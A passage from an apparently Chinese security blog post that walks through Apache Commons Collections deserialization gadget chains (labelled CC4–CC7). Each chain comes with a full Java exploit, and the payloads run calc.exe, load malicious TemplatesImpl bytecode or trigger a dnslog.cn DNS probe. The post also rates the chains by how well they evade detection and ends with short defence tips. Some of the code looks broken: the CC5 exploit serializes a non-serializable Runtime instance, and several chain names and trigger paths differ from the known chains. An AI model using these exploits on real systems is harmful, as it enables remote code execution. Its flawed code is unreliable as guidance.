        Transformer chainedTransformer = new ChainedTransformer(transformers);

        // 4. 构造LazyMap（键"triggerKey"不存在，用于触发get()）
        Map<String, TemplatesImpl> lazyMap = LazyMap.decorate(new HashMap<>(), chainedTransformer);
        lazyMap.put("key", templates);

        // 5. 构造PriorityQueue，添加两个LazyMap实例（触发排序）
        PriorityQueue



<map> queue = new PriorityQueue<>((o1, o2) -> {
            // 比较器：调用o1.get("triggerKey")，触发LazyMap.get()
            o1.get("triggerKey");
            return 0;
        });
        queue.add(lazyMap);
        queue.add(lazyMap);

        // 6. 反射清空队列元素的comparator（避免序列化前触发）
        Field comparatorField = PriorityQueue.class.getDeclaredField("comparator");
        comparatorField.setAccessible(true);
        comparatorField.set(queue, null);

        // 7. 序列化与反序列化
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc4.ser"));
        oos.writeObject(queue);
        oos.close();

        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("cc4.ser"));
        ois.readObject();
        ois.close();
    }

    // 辅助方法：获取类字节码（同前）
    private static byte[] getClassBytecode(Class<?> cls) throws Exception {
        File file = new File(cls.getProtectionDomain().getCodeSource().getLocation().toURI());
        FileInputStream fis = new FileInputStream(new File(file, cls.getName().replace(".", "/") + ".class"));
        byte[] bytes = new byte[fis.available()];
        fis.read(bytes);
        fis.close();
        return bytes;
    }
}</map>
```


 
<h3 class="md-end-block md-heading"><span class="md-plain">5.5 特点与局限性</span></h3>
<ul class="ul-list" data-mark="*">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">特点</span></strong></span><span class="md-plain">：利用</span><span class="md-pair-s" spellcheck="false"><code>PriorityQueue</code></span><span class="md-plain">的排序特性被动触发，触发流程更隐蔽，几乎不依赖 “主动修改元素”；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">局限性</span></strong></span><span class="md-plain">：需构造特定的比较器，且</span><span class="md-pair-s" spellcheck="false"><code>PriorityQueue</code></span><span class="md-plain">在部分环境中可能不常用，兼容性略低于前几条链。</span></p>
</li>
</ul>
<h2 class="md-end-block md-heading"><span class="md-plain">六、CC5 链分析（基于 ConstantTransformer 简化调用链）</span></h2>
<h3 class="md-end-block md-heading"><span class="md-plain">6.1 基本信息</span></h3>
<ul class="ul-list" data-mark="*">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">依赖版本</span></strong></span><span class="md-plain">：Apache Commons Collections 3.1</span>~<span class="md-plain">3.2.1；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">核心思路</span></strong></span><span class="md-plain">：引入</span><span class="md-pair-s" spellcheck="false"><code>ConstantTransformer</code></span><span class="md-plain">（返回固定对象的</span><span class="md-pair-s" spellcheck="false"><code>Transformer</code></span><span class="md-plain">），替代 CC1 中通过多步反射获取</span><span class="md-pair-s" spellcheck="false"><code>Runtime</code></span><span class="md-plain">实例的逻辑，简化调用链，提高稳定性。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">6.2 关键类与方法</span></h3>
<figure class="md-table-fig table-figure">
<table class="md-table">
<thead>
<tr class="md-end-block">
<th><span class="td-span"><span class="md-plain">类名</span></span></th>
<th><span class="td-span"><span class="md-plain">核心方法</span></span></th>
<th><span class="td-span"><span class="md-plain">作用</span></span></th>
</tr>
</thead>
<tbody>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>ConstantTransformer</code></span></span></td>
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>transform(Object input)</code></span></span></td>
<td><span class="td-span"><span class="md-plain">直接返回预设的对象（如</span><span class="md-pair-s" spellcheck="false"><code>Runtime</code></span><span class="md-plain">实例）</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>ChainedTransformer</code></span></span></td>
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>transform(Object input)</code></span></span></td>
<td><span class="td-span"><span class="md-plain">串联</span><span class="md-pair-s" spellcheck="false"><code>ConstantTransformer</code></span><span class="md-plain">与</span><span class="md-pair-s" spellcheck="false"><code>InvokerTransformer</code></span></span></td>
</tr>
</tbody>
</table>
</figure>
<h3 class="md-end-block md-heading"><span class="md-plain">6.3 调用流程（核心链路）</span></h3>
<div class="md-diagram-panel md-fences-adv-panel">
<div class="md-diagram-panel-error md-fences-adv-panel-error"><img class="alignnone size-large wp-image-987" src="/wp-content/uploads/2025/img-fabce0278e68.png" alt="" width="1024" height="396" /></div>
</div>
<h3 class="md-end-block md-heading"><span class="md-plain">6.4 EXP 实现</span></h3>


```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.io.*;
import java.util.HashMap;
import java.util.Map;

public class CC5Exp {
    public static void main(String[] args) throws Exception {
        // 1. 直接获取Runtime实例（通过getRuntime()）
        Runtime runtime = Runtime.getRuntime();

        // 2. 构造调用链：ConstantTransformer返回Runtime实例 → InvokerTransformer调用exec()
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(runtime), // 直接返回预设的Runtime实例
                new InvokerTransformer("exec", 
                        new Class[]{String.class}, 
                        new Object[]{"calc.exe"}) // 调用exec()执行命令
        };
        Transformer chainedTransformer = new ChainedTransformer(transformers);

        // 3. 包装恶意Map并序列化
        Map<String, String> normalMap = new HashMap<>();
        normalMap.put("key", "value");
        Map<String, String> maliciousMap = TransformedMap.decorate(normalMap, null, chainedTransformer);

        // 4. 序列化与反序列化
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc5.ser"));
        oos.writeObject(maliciousMap);
        oos.close();

        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("cc5.ser"));
        ois.readObject();
        ois.close();
    }
}
```


<h3 class="md-end-block md-heading"><span class="md-plain">6.5 特点与局限性</span></h3>
<ul class="ul-list" data-mark="*">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">特点</span></strong></span><span class="md-plain">：调用链极简化（仅两步），稳定性高，不易因反射步骤错误导致漏洞失效；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">局限性</span></strong></span><span class="md-plain">：</span><span class="md-pair-s" spellcheck="false"><code>ConstantTransformer</code></span><span class="md-plain">返回的</span><span class="md-pair-s" spellcheck="false"><code>Runtime</code></span><span class="md-plain">实例在序列化时会被正常序列化，部分防护可能检测 “序列化流中的</span><span class="md-pair-s" spellcheck="false"><code>Runtime</code></span><span class="md-plain">对象”。</span></p>
</li>
</ul>
<h2 class="md-end-block md-heading"><span class="md-plain">七、CC6 链分析（结合 URLDNS 链的检测友好型）</span></h2>
<h3 class="md-end-block md-heading"><span class="md-plain">7.1 基本信息</span></h3>
<ul class="ul-list" data-mark="*">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">依赖版本</span></strong></span><span class="md-plain">：Apache Commons Collections 3.1</span>~<span class="md-plain">3.2.1；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">核心思路</span></strong></span><span class="md-plain">：结合 “URLDNS 链”（通过</span><span class="md-pair-s" spellcheck="false"><code>URL.hashCode()</code></span><span class="md-plain">触发 DNS 查询）与 CC 链，将恶意行为从 “命令执行” 改为 “DNS 查询”，适用于漏洞检测场景（不执行恶意命令，仅通过 DNS 日志判断漏洞存在）。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">7.2 关键类与方法</span></h3>
<figure class="md-table-fig table-figure">
<table class="md-table">
<thead>
<tr class="md-end-block">
<th><span class="td-span"><span class="md-plain">类名</span></span></th>
<th><span class="td-span"><span class="md-plain">核心方法</span></span></th>
<th><span class="td-span"><span class="md-plain">作用</span></span></th>
</tr>
</thead>
<tbody>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>URL</code></span></span></td>
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>hashCode()</code></span></span></td>
<td><span class="td-span"><span class="md-plain">计算哈希值时触发 DNS 查询</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>HashMap</code></span></span></td>
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>readObject()</code></span></span></td>
<td><span class="td-span"><span class="md-plain">调用</span><span class="md-pair-s" spellcheck="false"><code>hash()</code></span><span class="md-plain">，间接触发</span><span class="md-pair-s" spellcheck="false"><code>URL.hashCode()</code></span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>InvokerTransformer</code></span></span></td>
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>transform(Object input)</code></span></span></td>
<td><span class="td-span"><span class="md-plain">触发</span><span class="md-pair-s" spellcheck="false"><code>URL.hashCode()</code></span></span></td>
</tr>
</tbody>
</table>
</figure>
<h3 class="md-end-block md-heading"><span class="md-plain">7.3 调用流程（核心链路）</span></h3>
<div class="md-diagram-panel md-fences-adv-panel">
<div class="md-diagram-panel-error md-fences-adv-panel-error"><img class="alignnone size-large wp-image-988" src="/wp-content/uploads/2025/img-4cd1b4dbae23.png" alt="" width="1024" height="674" /></div>
</div>
<h3 class="md-end-block md-heading"><span class="md-plain">7.4 EXP 实现</span></h3>


```
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import java.io.*;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.HashMap;
import java.util.Map;

public class CC6Exp {
    public static void main(String[] args) throws Exception {
        // 1. 构造攻击者的DNS域名（如"test.cc6.dnslog.cn"，需替换为实际DNSLog域名）
        URL maliciousUrl = new URL("http://test.cc6.dnslog.cn");

        // 2. 构造调用链：触发URL.hashCode()
        Transformer transformer = new InvokerTransformer("hashCode", new Class[0], new Object[0]);

        // 3. 包装恶意Map（键为URL对象，valueTransformer为触发hashCode()的Transformer）
        Map<URL, String> normalMap = new HashMap<>();
        normalMap.put(maliciousUrl, "value");
        Map<URL, String> maliciousMap = TransformedMap.decorate(normalMap, null, transformer);

        // 4. 反射修改URL的hostAddress为null（确保hashCode()重新触发DNS查询）
        java.lang.reflect.Field hostAddressField = URL.class.getDeclaredField("hostAddress");
        hostAddressField.setAccessible(true);
        hostAddressField.set(maliciousUrl, null);

        // 5. 序列化与反序列化（触发DNS查询）
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc6.ser"));
        oos.writeObject(maliciousMap);
        oos.close();

        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("cc6.ser"));
        ois.readObject(); // 反序列化时触发DNS查询，攻击者可在DNSLog平台查看记录
        ois.close();
    }
}
```


<h3 class="md-end-block md-heading"><span class="md-plain">7.5 特点与局限性</span></h3>
<ul class="ul-list" data-mark="*">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">特点</span></strong></span><span class="md-plain">：无恶意命令执行，仅用于漏洞检测，安全性高（不影响目标系统），适合渗透测试中的 “漏洞验证”；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">局限性</span></strong></span><span class="md-plain">：仅能检测漏洞存在，无法执行恶意操作，且依赖 DNSLog 平台的可用性。</span></p>
</li>
</ul>
<h2 class="md-end-block md-heading"><span class="md-plain">八、CC7 链分析（基于 4.0 + 版本的适配）</span></h2>
<h3 class="md-end-block md-heading"><span class="md-plain">8.1 基本信息</span></h3>
<ul class="ul-list" data-mark="*">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">依赖版本</span></strong></span><span class="md-plain">：Apache Commons Collections 4.0</span>~<span class="md-plain">4.4（修复了 3.x 的部分漏洞，需新的利用思路）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">核心思路</span></strong></span><span class="md-plain">：ACC 4.x 版本将</span><span class="md-pair-s" spellcheck="false"><code>InvokerTransformer</code></span><span class="md-plain">等危险类移至</span><span class="md-pair-s" spellcheck="false"><code>org.apache.commons.collections4.functors</code></span><span class="md-plain">包，并加强了访问控制，CC7 通过调用</span><span class="md-pair-s" spellcheck="false"><code>TransformerUtils.chainedTransformer()</code></span><span class="md-plain">替代直接实例化</span><span class="md-pair-s" spellcheck="false"><code>ChainedTransformer</code></span><span class="md-plain">，绕开访问限制。</span></p>
</li>
</ul>
<h3 class="md-end-block md-heading"><span class="md-plain">8.2 关键类与方法</span></h3>
<figure class="md-table-fig table-figure">
<table class="md-table">
<thead>
<tr class="md-end-block">
<th><span class="td-span"><span class="md-plain">类名</span></span></th>
<th><span class="td-span"><span class="md-plain">核心方法</span></span></th>
<th><span class="td-span"><span class="md-plain">作用</span></span></th>
</tr>
</thead>
<tbody>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>TransformerUtils</code></span></span></td>
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>chainedTransformer(Transformer[] transformers)</code></span></span></td>
<td><span class="td-span"><span class="md-plain">创建</span><span class="md-pair-s" spellcheck="false"><code>ChainedTransformer</code></span><span class="md-plain">实例（4.x 推荐方式）</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>LazyMap</code></span></span></td>
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>get(Object key)</code></span></span></td>
<td><span class="td-span"><span class="md-plain">触发恶意调用链</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>PriorityQueue</code></span></span></td>
<td><span class="td-span"><span class="md-pair-s" spellcheck="false"><code>readObject()</code></span></span></td>
<td><span class="td-span"><span class="md-plain">被动触发</span><span class="md-pair-s" spellcheck="false"><code>LazyMap.get()</code></span></span></td>
</tr>
</tbody>
</table>
</figure>
<h3 class="md-end-block md-heading"><span class="md-plain">8.3 调用流程（核心链路）</span></h3>
<div class="md-diagram-panel md-fences-adv-panel">
<div class="md-diagram-panel-error md-fences-adv-panel-error"><img class="alignnone size-large wp-image-989" src="/wp-content/uploads/2025/img-caa83a6fcbe7.png" alt="" width="1024" height="816" /></div>
</div>
<h3 class="md-end-block md-heading"><span class="md-plain">8.4 EXP 实现</span></h3>


```
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.InvokerTransformer;
import org.apache.commons.collections4.map.LazyMap;
import org.apache.commons.collections4.TransformerUtils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;
import java.util.PriorityQueue;

public class CC7Exp {
    // 1. 恶意Translet类（同前）
    static class MaliciousTranslet extends AbstractTranslet {
        static {
            try {
                Runtime.getRuntime().exec("calc.exe");
            } catch (IOException e) {
                throw new RuntimeException(e);
            }
        }
        @Override
        public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM dom, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xalan.internal.xsltc.translet.TransletOutputHandler outputHandler, com.sun.org.apache.xml.internal.serializer.Serializer serializer) throws Exception {}
        @Override
        public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM dom, com.sun.org.apache.xml.internal.dtm.DTMAxisIterator iterator, com.sun.org.apache.xalan.internal.xsltc.translet.TransletOutputHandler outputHandler) throws Exception {}
    }

    public static void main(String[] args) throws Exception {
        // 2. 准备TemplatesImpl实例
        byte[] maliciousBytecode = getClassBytecode(MaliciousTranslet.class);
        TemplatesImpl templates = new TemplatesImpl();
        Field bytecodesField = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodesField.setAccessible(true);
        bytecodesField.set(templates, new byte[][]{maliciousBytecode});

        // 3. 用TransformerUtils创建ChainedTransformer（适配4.x版本）
        Transformer[] transformers = new Transformer[]{
                new InvokerTransformer("getOutputProperties", new Class[0], new Object[0])
        };
        Transformer chainedTransformer = TransformerUtils.chainedTransformer(transformers);

        // 4. 构造LazyMap与PriorityQueue（同CC4）
        Map<String, TemplatesImpl> lazyMap = LazyMap.lazyMap(new HashMap<>(), chainedTransformer);
        lazyMap.put("key", templates);

        PriorityQueue
<map> queue = new PriorityQueue<>((o1, o2) -> {
            o1.get("triggerKey");
            return 0;
        });
        queue.add(lazyMap);
        queue.add(lazyMap);

        // 5. 清空comparator，避免提前触发
        Field comparatorField = PriorityQueue.class.getDeclaredField("comparator");
        comparatorField.setAccessible(true);
        comparatorField.set(queue, null);

        // 6. 序列化与反序列化
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc7.ser"));
        oos.writeObject(queue);
        oos.close();

        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("cc7.ser"));
        ois.readObject();
        ois.close();
    }

    // 辅助方法：获取类字节码（同前）
    private static byte[] getClassBytecode(Class<?> cls) throws Exception {
        File file = new File(cls.getProtectionDomain().getCodeSource().getLocation().toURI());
        FileInputStream fis = new FileInputStream(new File(file, cls.getName().replace(".", "/") + ".class"));
        byte[] bytes = new byte[fis.available()];
        fis.read(bytes);
        fis.close();
        return bytes;
    }
}</map>
```


<h3 class="md-end-block md-heading"><span class="md-plain">8.5 特点与局限性</span></h3>
<ul class="ul-list" data-mark="*">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">特点</span></strong></span><span class="md-plain">：适配 ACC 4.x 版本，绕开了 4.x 对危险类的访问限制，兼容性覆盖更广；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">局限性</span></strong></span><span class="md-plain">：4.x 版本仍在不断修复漏洞，部分高版本（如 4.5+）可能已无法利用。</span></p>
</li>
</ul>
<h2 class="md-end-block md-heading"><span class="md-plain">九、各 CC 链子链对比与总结</span></h2>
<figure class="md-table-fig table-figure">
<table class="md-table">
<thead>
<tr class="md-end-block">
<th><span class="td-span"><span class="md-plain">子链</span></span></th>
<th><span class="td-span"><span class="md-plain">核心触发类</span></span></th>
<th><span class="td-span"><span class="md-plain">依赖 ACC 版本</span></span></th>
<th><span class="td-span"><span class="md-plain">特点</span></span></th>
<th><span class="td-span"><span class="md-plain">适用场景</span></span></th>
</tr>
</thead>
<tbody>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-plain">CC1</span></span></td>
<td><span class="td-span"><span class="md-plain">TransformedMap</span></span></td>
<td><span class="td-span"><span class="md-plain">3.1</span>~<span class="md-plain">3.2.1</span></span></td>
<td><span class="td-span"><span class="md-plain">基础经典，易理解</span></span></td>
<td><span class="td-span"><span class="md-plain">入门学习、低版本 ACC 环境</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-plain">CC2</span></span></td>
<td><span class="td-span"><span class="md-plain">TransformedMap+TemplatesImpl</span></span></td>
<td><span class="td-span"><span class="md-plain">3.1</span>~<span class="md-plain">3.2.1</span></span></td>
<td><span class="td-span"><span class="md-plain">字节码加载，绕开直接命令检测</span></span></td>
<td><span class="td-span"><span class="md-plain">需隐蔽执行命令的场景</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-plain">CC3</span></span></td>
<td><span class="td-span"><span class="md-plain">LazyMap</span></span></td>
<td><span class="td-span"><span class="md-plain">3.1</span>~<span class="md-plain">3.2.1</span></span></td>
<td><span class="td-span"><span class="md-plain">get () 触发，更隐蔽</span></span></td>
<td><span class="td-span"><span class="md-plain">绕开 TransformedMap 检测的场景</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-plain">CC4</span></span></td>
<td><span class="td-span"><span class="md-plain">PriorityQueue+LazyMap</span></span></td>
<td><span class="td-span"><span class="md-plain">3.1</span>~<span class="md-plain">3.2.1</span></span></td>
<td><span class="td-span"><span class="md-plain">被动排序触发，检测绕过能力强</span></span></td>
<td><span class="td-span"><span class="md-plain">高防护环境的命令执行</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-plain">CC5</span></span></td>
<td><span class="td-span"><span class="md-plain">ConstantTransformer</span></span></td>
<td><span class="td-span"><span class="md-plain">3.1</span>~<span class="md-plain">3.2.1</span></span></td>
<td><span class="td-span"><span class="md-plain">调用链简化，稳定性高</span></span></td>
<td><span class="td-span"><span class="md-plain">对稳定性要求高的漏洞利用</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-plain">CC6</span></span></td>
<td><span class="td-span"><span class="md-plain">URL+TransformedMap</span></span></td>
<td><span class="td-span"><span class="md-plain">3.1</span>~<span class="md-plain">3.2.1</span></span></td>
<td><span class="td-span"><span class="md-plain">DNS 查询，仅用于检测</span></span></td>
<td><span class="td-span"><span class="md-plain">漏洞验证、无恶意操作场景</span></span></td>
</tr>
<tr class="md-end-block">
<td><span class="td-span"><span class="md-plain">CC7</span></span></td>
<td><span class="td-span"><span class="md-plain">TransformerUtils+PriorityQueue</span></span></td>
<td><span class="td-span"><span class="md-plain">4.0</span>~<span class="md-plain">4.4</span></span></td>
<td><span class="td-span"><span class="md-plain">适配 4.x 版本，兼容性广</span></span></td>
<td><span class="td-span"><span class="md-plain">高版本 ACC 环境的命令执行</span></span></td>
</tr>
</tbody>
</table>
</figure>
<h3 class="md-end-block md-heading"><span class="md-plain">防御建议</span></h3>
<ol class="ol-list" start="">
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">升级 ACC 库</span></strong></span><span class="md-plain">：将 Apache Commons Collections 升级至最新版本（如 3.2.2+、4.5+），修复已知漏洞；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">序列化过滤</span></strong></span><span class="md-plain">：使用 Java 序列化过滤机制（如</span><span class="md-pair-s" spellcheck="false"><code>ObjectInputFilter</code></span><span class="md-plain">），禁止反序列化 ACC 库的危险类（如</span><span class="md-pair-s" spellcheck="false"><code>InvokerTransformer</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>ChainedTransformer</code></span><span class="md-plain">）；</span></p>
</li>
 	<li class="md-list-item">
<p class="md-end-block md-p"><span class="md-pair-s "><strong><span class="md-plain">字节码检测</span></strong></span><span class="md-plain">：监控</span><span class="md-pair-s" spellcheck="false"><code>TemplatesImpl.defineClass()</code></span><span class="md-plain">等字节码加载行为，拦截恶意字节码；</span></p>
</li>
 	<li class="md-list-item md-focus-container">
<p class="md-end-block md-p md-focus"><span class="md-pair-s "><strong><span class="md-plain">命令执行监控</span></strong></span><span class="md-plain">：对</span><span class="md-pair-s" spellcheck="false"><code>Runtime.exec()</code></span><span class="md-plain">、</span><span class="md-pair-s" spellcheck="false"><code>ProcessBuilder</code></span><span class="md-plain md-expand">等危险方法进行 Hook，检测异常调用。</span></p>
</li>
</ol>
